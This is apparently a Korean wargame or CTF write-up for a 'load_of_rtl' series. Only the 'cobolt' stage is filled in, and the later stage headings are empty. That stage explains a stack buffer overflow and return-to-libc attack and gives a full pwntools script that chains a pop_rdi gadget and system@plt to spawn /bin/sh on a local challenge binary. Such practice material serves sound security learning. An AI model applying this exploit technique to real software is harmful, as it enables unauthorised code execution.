# load_of_rtl

## cobolt

You can use write, read, system and /bin/sh  
gdb를 통해 디버깅하여 system_plt = 0x4010b0임을 알 수 있고, pop_rdi 가젯의 주소와 /bin/sh의 주소를 확인할 수 있다.
버퍼의 크기와 dummy, SFP를 덮은 뒤 ret를 pop_rdi 가젯의 주소로 덮는다. pop_rdi 가젯을 활용하면 rdi에 /bin/sh의 주소를 넣은 뒤 system 함수의 plt로 return하여 system("/bin/sh")를 호출하게 된다.


```pyton
from pwn import *

p = process("./cobolt")

pop_rdi = 0x401353
binsh = 0x404060
system_plt = 0x4010b0

p.recvuntil(b"You can use write, read, system and /bin/sh\n")

payload = b'A'*0x40
payload += b'B'*0x8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rdi+1)
payload += p64(system_plt)
p.send(payload)

p.interactive()
```


## goblin





## gremlin



## orc




## wolfman
